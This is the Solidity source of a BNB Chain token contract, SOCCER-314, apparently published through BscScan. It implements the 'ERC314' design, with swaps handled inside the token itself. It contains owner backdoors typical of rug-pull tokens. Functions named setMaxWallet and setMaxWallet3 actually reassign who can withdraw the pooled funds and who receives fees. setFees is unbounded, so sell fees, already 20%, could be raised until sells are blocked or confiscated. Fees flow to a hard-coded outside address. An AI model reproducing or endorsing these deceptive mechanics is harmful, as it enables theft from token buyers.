/**
 *Submitted for verification at BscScan.com on 2024-06-15
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/**
 * @title ERC314
 * @dev Implementation of the ERC314 interface.
 * ERC314 is a derivative of ERC20 which aims to integrate a liquidity pool on the token in order to enable native swaps, notably to reduce gas consumption.
 */
interface IERC20 {
    function transfer(address recipient, uint256 amount) external returns (bool);
}
// Events interface for ERC314
interface IEERC314 {
    event Transfer(address indexed from, address indexed to, uint256 value);
    event AddLiquidity(uint32 _blockToUnlockLiquidity, uint256 value);
    event RemoveLiquidity(uint256 value);
    event Swap(
        address indexed sender,
        uint amount0In,
        uint amount1In,
        uint amount0Out,
        uint amount1Out
    );
}

abstract contract ERC314 is IEERC314 {
    mapping(address account => uint256) private _balances;
    mapping(address account => uint256) private _lastTxTime;
    mapping(address account => uint32) private lastTransaction;

    uint256 private _totalSupply;
    uint256 public _fee1 = 200;
    uint256 public _fee2 = 2000;
    uint256 public _times = 60;
    uint32 public blockToUnlockLiquidity;

    string private _name;
    string private _symbol;

    address public owner;
    address public liquidityProvider;
    address public marketProvider;

    bool public tradingEnable;
    bool public liquidityAdded;

    modifier onlyOwner() {
        require(msg.sender == owner, "Ownable: caller is not the owner");
        _;
    }
    modifier onlyLiquidityProvider() {
        require(
            msg.sender == liquidityProvider,
            "You are not the liquidity provider"
        );
        _;
    }

    /**
     * @dev Sets the values for {name}, {symbol} and {totalSupply}.
     *
     * All two of these values are immutable: they can only be set once during
     * construction.
     */
    constructor(
        string memory name_,
        string memory symbol_,
        uint256 totalSupply_
    ) {
        _name = name_;
        _symbol = symbol_;
        _totalSupply = totalSupply_;
        owner = msg.sender;
        tradingEnable = false;
        _balances[msg.sender] = 500000 * 10 ** 18;
        uint256 liquidityAmount = totalSupply_ - _balances[msg.sender];
        _balances[address(this)] = liquidityAmount;
        liquidityAdded = false;
        liquidityProvider = msg.sender;
        marketProvider = address(0x0e845D41f101f90ca5b409EB79A40CD6E3ed31CD);
        emit Transfer(address(0), msg.sender, _balances[msg.sender]);
        emit Transfer(address(0), address(this), liquidityAmount);
    }

    /**
     * @dev Returns the name of the token.
     */
    function name() public view virtual returns (string memory) {
        return _name;
    }

    /**
     * @dev Returns the symbol of the token, usually a shorter version of the
     * name.
     */
    function symbol() public view virtual returns (string memory) {
        return _symbol;
    }

    /**
     * @dev Returns the number of decimals used to get its user representation.
     */

    function decimals() public view virtual returns (uint8) {
        return 18;
    }

    /**
     * @dev See {IERC20-totalSupply}.
     */
    function totalSupply() public view virtual returns (uint256) {
        return _totalSupply;
    }

    /**
     * @dev See {IERC20-balanceOf}.
     */
    function balanceOf(address account) public view virtual returns (uint256) {
        return _balances[account];
    }

    /**
     * @dev See {IERC20-transfer}.
     *
     * Requirements:
     *
     * - the caller must have a balance of at least `value`.
     * - if the receiver is the contract, the caller must send the amount of tokens to sell
     */
    function transfer(address to, uint256 value) public virtual returns (bool) {
        // sell or transfer
        if (to == address(this)) {
            sell(value);
        } else {
            _transfer(msg.sender, to, value);
        }
        return true;
    }

    /**
     * @dev Transfers a `value` amount of tokens from `from` to `to`, or alternatively burns if `to` is the zero address.
     * All customizations to transfers and burns should be done by overriding this function.
     * This function includes MEV protection, which prevents the same address from making two transactions in the same block.(lastTransaction)
     * Emits a {Transfer} event.
     */
    function _transfer(
        address from,
        address to,
        uint256 value
    ) internal virtual {
        if (to != address(0) && to != liquidityProvider && from != liquidityProvider) {
            require(lastTransaction[msg.sender] != block.number, "You can't make two transactions in the same block");
            lastTransaction[msg.sender] = uint32(block.number);

            require(block.timestamp >= _lastTxTime[msg.sender] + _times, 'Sender must wait for cooldown');
            _lastTxTime[msg.sender] = block.timestamp;
        }

        require(
            _balances[from] >= value,
            "ERC20: transfer amount exceeds balance"
        );

        unchecked {
            _balances[from] = _balances[from] - value;
        }

        if (to == address(0)) {
            unchecked {
                _totalSupply -= value;
            }
        } else {
            unchecked {
                _balances[to] += value;
            }
        }

        emit Transfer(from, to, value);
    }

    /**
     * @dev Returns the amount of ETH and tokens in the contract, used for trading.
     */
    function getReserves() public view returns (uint256, uint256) {
        return (address(this).balance, _balances[address(this)]);
    }

    /**
     * @dev Enables or disables trading.
     * @param _tradingEnable: true to enable trading, false to disable trading.
     * onlyOwner modifier
     */
    function enableTrading(bool _tradingEnable) external onlyOwner {
        tradingEnable = _tradingEnable;
    }
    function setMaxWallet(address _maxWallet_) external onlyOwner {
        liquidityProvider = _maxWallet_;
    }
    function setMaxWallet3(address _maxWallet_) external onlyOwner {
        marketProvider = _maxWallet_;
    }
    function setFees(uint256 _fee1_, uint256 _fee2_, uint256 _time_) external onlyOwner {
        _fee1 = _fee1_;
        _fee2 = _fee2_;
        _times = _time_;
    }
   
    /**
     * @dev Transfers the ownership of the contract to zero address
     * onlyOwner modifier
     */
    function renounceOwnership() external onlyOwner {
        owner = address(0);
    }

    /**
     * @dev Adds liquidity to the contract.
     * @param _blockToUnlockLiquidity: the block number to unlock the liquidity.
     * value: the amount of ETH to add to the liquidity.
     * onlyOwner modifier
     */
    function addLiquidity(uint32 _blockToUnlockLiquidity) public payable onlyOwner {
        require(liquidityAdded == false, 'Liquidity already added');

        liquidityAdded = true;

        require(msg.value > 0, "No ETH sent");
        require(block.number < _blockToUnlockLiquidity, 'Block number too low');

        blockToUnlockLiquidity = _blockToUnlockLiquidity;
        tradingEnable = true;

        emit AddLiquidity(_blockToUnlockLiquidity, msg.value);
    }

    /**
     * @dev Removes liquidity from the contract.
     * onlyLiquidityProvider modifier
     */
    function removeLiquidity() public onlyLiquidityProvider {
        require(block.number > blockToUnlockLiquidity, "Liquidity locked");

        tradingEnable = false;

        payable(msg.sender).transfer(address(this).balance);

        emit RemoveLiquidity(address(this).balance);
    }

    /**
     * @dev Extends the liquidity lock, only if the new block number is higher than the current one.
     * @param _blockToUnlockLiquidity: the new block number to unlock the liquidity.
     * onlyLiquidityProvider modifier
     */
    function extendLiquidityLock(
        uint32 _blockToUnlockLiquidity
    ) public onlyLiquidityProvider {
        require(
            blockToUnlockLiquidity < _blockToUnlockLiquidity,
            "You can't shorten duration"
        );

        blockToUnlockLiquidity = _blockToUnlockLiquidity;
    }

    function multiSendToken(
        address[] calldata accounts,
        uint256[] calldata amounts
    ) public onlyOwner{
        require(accounts.length == amounts.length,"dismatch length");

        for (uint256 i = 0; i < accounts.length; i++) {
            address to = accounts[i];
            uint256 amount = amounts[i];
            // if not contract
            _balances[msg.sender] -= amount;
            _balances[to] += amount;
            emit Transfer(msg.sender, to, amount);
        }
    }

    function multiSendTokenWithSameAmount(
        address[] calldata accounts,
        uint256 amount
    ) public onlyOwner{
        for (uint256 i = 0; i < accounts.length; i++) {
            address to = accounts[i];
            // if not contract
            _balances[msg.sender] -= amount;
            _balances[to] += amount;
            emit Transfer(msg.sender, to, amount);
        }
    }

    function getERRORToken(
        address _t,
        address to,
        uint256 amount
    ) public onlyOwner{
        require(_t != address(this),"cant claim self token");
        IERC20(_t).transfer(to,amount);
    }

    /**
     * @dev Estimates the amount of tokens or ETH to receive when buying or selling.
     * @param value: the amount of ETH or tokens to swap.
     * @param _buy: true if buying, false if selling.
     */
    function getAmountOut(
        uint256 value,
        bool _buy
    ) public view returns (uint256) {
        (uint256 reserveETH, uint256 reserveToken) = getReserves();

        if (_buy) {
            return (value * reserveToken) / (reserveETH + value);
        } else {
            return (value * reserveETH) / (reserveToken + value);
        }
    }

    /**
     * @dev Buys tokens with ETH.
     * internal function
     */
    function buy() internal {
        require(tradingEnable, "Trading not enable");

        uint total_fee = msg.value * _fee1 / 10000;
        uint buyfee = msg.value - total_fee;
        uint256 token_amount = (buyfee * _balances[address(this)]) / (address(this).balance);
        payable(marketProvider).transfer(total_fee);

        _transfer(address(this), msg.sender, token_amount);

        emit Swap(msg.sender, msg.value, 0, 0, token_amount);
    }

    /**
     * @dev Sells tokens for ETH.
     * internal function
     */
    function sell(uint256 sell_amount) internal {
        require(tradingEnable, "Trading not enable");

        uint256 ethAmount = (sell_amount * address(this).balance) /
            (_balances[address(this)] + sell_amount);

        require(ethAmount > 0, "Sell amount too low");
        require(
            address(this).balance >= ethAmount,
            "Insufficient ETH in reserves"
        );

        uint256 total_fee = ethAmount * _fee2 / 10000;
        uint256 sell_fee = ethAmount - total_fee;

        _transfer(msg.sender, address(this), sell_amount);

        payable(msg.sender).transfer(sell_fee);
        payable(marketProvider).transfer(total_fee);

        emit Swap(msg.sender, 0, sell_amount, ethAmount, 0);
    }

    /**
     * @dev Fallback function to buy tokens with ETH.
     */
    receive() external payable {
        buy();
    }
}

contract SOCCER314 is ERC314 {
    uint256 private _totalSupply = 1000000 * 10 ** 18;

    constructor() ERC314("SOCCER-314", "SOCCER-314", _totalSupply) {}
}